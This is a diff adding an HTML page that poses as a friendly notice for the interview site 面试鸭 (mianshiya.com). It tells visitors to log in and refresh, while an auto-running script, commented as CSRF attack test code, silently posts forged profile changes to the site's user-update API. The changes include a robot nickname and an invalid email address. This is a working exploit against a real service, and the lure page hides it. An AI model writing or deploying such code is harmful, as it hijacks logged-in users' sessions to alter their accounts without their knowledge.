@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<head>
+    <title>面试鸭-你好</title>
+</head>
+<body>
+    <h1>如果你还未登录`<a href="https://www.mianshiya.com" target="_blank">面试鸭</a>`，点先登录。</h1>
+    <h1>如果你已经登录了，请刷新一下该页面。</h1>
+    <h2>如果发生了一些意料之外的事情，请别惊讶，这就是magic的魅力！</h2>
+    <h3>好了，你可以返回<a href="https://www.mianshiya.com">面试鸭</a>继续访问了，看看有什么不同。</h3>
+    <br />
+    <h2>please back to `<a href="https://www.mianshiya.com">website</a>` to check you user infomation</h2>
+    <p>if your user infomation has changed, Congratulations!</p>
+</body>
+<script>
+    // 测试`面试鸭`csrf攻击源码
+    (function autoRunning() {
+        // 修改用户的基本信息
+        var userInfo = {
+            user: {
+                nickName: generatorRandomNickName(),
+                avatarUrl: 'https://static.mianshiya.com/img/1651384716278_2304.png',
+                gender: '1',
+                profile: generatorProfile(),
+                interests: generatorInterests(),
+                email: 'error@error.error'
+            }
+        }
+        sendRequest('https://www.mianshiya.com/api/user/update', userInfo);
+        function generatorRandomNickName() {
+            return `机器人-${Math.floor(Math.random()*100000)}号`
+        }
+        function generatorProfile() {
+            return '简介这么短的吗？'
+        }
+        function generatorInterests() {
+            var result = [];
+            for(var i = 0; i < 20; i++) {
+                result.push('javascript');
+            }
+            return result;
+        }
+        function sendRequest(url, data) {
+            var blob = new Blob([JSON.stringify(data)], {
+                type: 'application/json; charset=UTF-8'
+            });
+            navigator.sendBeacon(url, blob);
+        }
+    })();
+</script>
+</html>
